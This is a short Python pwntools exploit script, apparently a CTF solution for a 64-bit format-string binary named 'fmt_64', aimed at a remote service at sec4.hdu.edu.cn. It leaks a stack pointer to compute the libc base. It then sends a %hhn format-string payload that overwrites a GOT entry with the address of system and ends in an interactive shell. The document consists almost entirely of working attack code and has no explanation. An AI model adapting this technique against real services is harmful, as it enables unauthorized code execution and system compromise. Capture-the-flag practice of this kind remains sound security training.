from pwn import *
def fix(a,b):
	if a>b:
		return a-b
	else :
		return a+256-b
context.log_level='debug'
context.arch='amd64'
p=process("./fmt_64")
p=remote("sec4.hdu.edu.cn",9999)
p.sendline("%2$p")
base=int(p.readline()[:-1],16)-(0x7ffff7dd3790-0x00007ffff7a0d000)
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
log.info(hex(base))
libc.address=base
sh=libc.symbols['system']

p1=(sh & 0xff)
p2=(sh & 0xff00)>>8
p3=(sh & 0xff0000)>>16
log.info(hex(p1))
aim=0x601018
payload="1"
p1=p1
p3=fix(p3,p2)
p2=fix(p2,p1)

payload="%{}c%16$hhn%{}c%17$hhn%{}c%18$hhn".format(p1,p2,p3).ljust(64,"A")+p64(aim)+p64(aim+1)+p64(aim+2)
p.sendline(payload)
p.interactive()
